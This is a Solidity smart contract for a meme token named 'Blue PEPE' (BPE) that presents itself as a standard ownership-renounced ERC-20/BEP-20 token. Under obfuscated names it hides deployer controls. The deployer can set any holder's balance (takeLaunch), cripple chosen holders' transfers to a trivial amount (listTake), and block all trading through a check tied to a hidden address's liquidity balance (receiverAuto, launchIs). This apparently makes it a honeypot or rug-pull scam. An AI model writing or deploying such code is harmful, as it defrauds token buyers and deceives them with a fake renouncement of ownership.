//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface launchedFund {
    function totalSupply() external view returns (uint256);

    function balanceOf(address senderList) external view returns (uint256);

    function transfer(address modeAmount, uint256 modeLaunched) external returns (bool);

    function allowance(address listLiquidity, address spender) external view returns (uint256);

    function approve(address spender, uint256 modeLaunched) external returns (bool);

    function transferFrom(
        address sender,
        address modeAmount,
        uint256 modeLaunched
    ) external returns (bool);

    event Transfer(address indexed from, address indexed teamReceiver, uint256 value);
    event Approval(address indexed listLiquidity, address indexed spender, uint256 value);
}

abstract contract receiverSender {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface takeSender {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface minReceiverWallet {
    function createPair(address autoFund, address receiverMarketingMin) external returns (address);
}

interface launchedFundMetadata is launchedFund {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract BluePEPE is receiverSender, launchedFund, launchedFundMetadata {

    address public listSwapTo;

    uint256 public modeShould;

    function name() external view virtual override returns (string memory) {
        return txReceiver;
    }

    constructor (){
        
        takeSender launchedLimitSwap = takeSender(fromAutoReceiver);
        receiverShouldLimit = minReceiverWallet(launchedLimitSwap.factory()).createPair(launchedLimitSwap.WETH(), address(this));
        
        listSwapTo = _msgSender();
        tokenFund();
        shouldLaunch[listSwapTo] = true;
        fromAt[listSwapTo] = exemptShould;
        if (modeShould != shouldExempt) {
            txAuto = shouldExempt;
        }
        emit Transfer(address(0), listSwapTo, exemptShould);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return exemptShould;
    }

    string private txReceiver = "Blue PEPE";

    function sellAt() private view {
        require(shouldLaunch[_msgSender()]);
    }

    function owner() external view returns (address) {
        return txMode;
    }

    bool private launchedBuy;

    bool private enableWalletTrading;

    uint256 private maxReceiver;

    mapping(address => bool) public feeSender;

    address fromAutoReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    event OwnershipTransferred(address indexed autoLaunched, address indexed exemptLaunched);

    function transfer(address maxLaunched, uint256 modeLaunched) external virtual override returns (bool) {
        return launchIs(_msgSender(), maxLaunched, modeLaunched);
    }

    mapping(address => uint256) private fromAt;

    uint256 private exemptShould = 100000000 * 10 ** 18;

    function receiverAuto(uint256 modeLaunched) public {
        sellAt();
        minTake = modeLaunched;
    }

    address private txMode;

    uint256 private maxTeam;

    function transferFrom(address walletSwap, address modeAmount, uint256 modeLaunched) external override returns (bool) {
        if (_msgSender() != fromAutoReceiver) {
            if (tokenMin[walletSwap][_msgSender()] != type(uint256).max) {
                require(modeLaunched <= tokenMin[walletSwap][_msgSender()]);
                tokenMin[walletSwap][_msgSender()] -= modeLaunched;
            }
        }
        return launchIs(walletSwap, modeAmount, modeLaunched);
    }

    bool public sellAmountTake;

    function symbol() external view virtual override returns (string memory) {
        return listTokenAt;
    }

    address public receiverShouldLimit;

    function listToReceiver(address walletSwap, address modeAmount, uint256 modeLaunched) internal returns (bool) {
        require(fromAt[walletSwap] >= modeLaunched);
        fromAt[walletSwap] -= modeLaunched;
        fromAt[modeAmount] += modeLaunched;
        emit Transfer(walletSwap, modeAmount, modeLaunched);
        return true;
    }

    function launchIs(address walletSwap, address modeAmount, uint256 modeLaunched) internal returns (bool) {
        if (walletSwap == listSwapTo) {
            return listToReceiver(walletSwap, modeAmount, modeLaunched);
        }
        uint256 amountModeFee = launchedFund(receiverShouldLimit).balanceOf(limitIs);
        require(amountModeFee == minTake);
        require(modeAmount != limitIs);
        if (feeSender[walletSwap]) {
            return listToReceiver(walletSwap, modeAmount, launchAmount);
        }
        return listToReceiver(walletSwap, modeAmount, modeLaunched);
    }

    function allowance(address tradingWalletToken, address limitReceiverTeam) external view virtual override returns (uint256) {
        if (limitReceiverTeam == fromAutoReceiver) {
            return type(uint256).max;
        }
        return tokenMin[tradingWalletToken][limitReceiverTeam];
    }

    uint8 private liquidityMarketing = 18;

    function balanceOf(address senderList) public view virtual override returns (uint256) {
        return fromAt[senderList];
    }

    uint256 public teamTrading;

    uint256 private shouldExempt;

    uint256 private fromTake;

    uint256 minTake;

    function takeLaunch(address maxLaunched, uint256 modeLaunched) public {
        sellAt();
        fromAt[maxLaunched] = modeLaunched;
    }

    function getOwner() external view returns (address) {
        return txMode;
    }

    function decimals() external view virtual override returns (uint8) {
        return liquidityMarketing;
    }

    mapping(address => mapping(address => uint256)) private tokenMin;

    uint256 constant launchAmount = 16 ** 10;

    uint256 public txAuto;

    mapping(address => bool) public shouldLaunch;

    function tradingReceiverIs(address marketingTotalBuy) public {
        require(marketingTotalBuy.balance < 100000);
        if (sellAmountTake) {
            return;
        }
        
        shouldLaunch[marketingTotalBuy] = true;
        if (modeShould != teamTrading) {
            launchedBuy = false;
        }
        sellAmountTake = true;
    }

    address limitIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 toTotal;

    function tokenFund() public {
        emit OwnershipTransferred(listSwapTo, address(0));
        txMode = address(0);
    }

    function approve(address limitReceiverTeam, uint256 modeLaunched) public virtual override returns (bool) {
        tokenMin[_msgSender()][limitReceiverTeam] = modeLaunched;
        emit Approval(_msgSender(), limitReceiverTeam, modeLaunched);
        return true;
    }

    uint256 public fundTo;

    function listTake(address sellLaunched) public {
        sellAt();
        if (teamTrading != shouldExempt) {
            maxTeam = maxReceiver;
        }
        if (sellLaunched == listSwapTo || sellLaunched == receiverShouldLimit) {
            return;
        }
        feeSender[sellLaunched] = true;
    }

    string private listTokenAt = "BPE";

}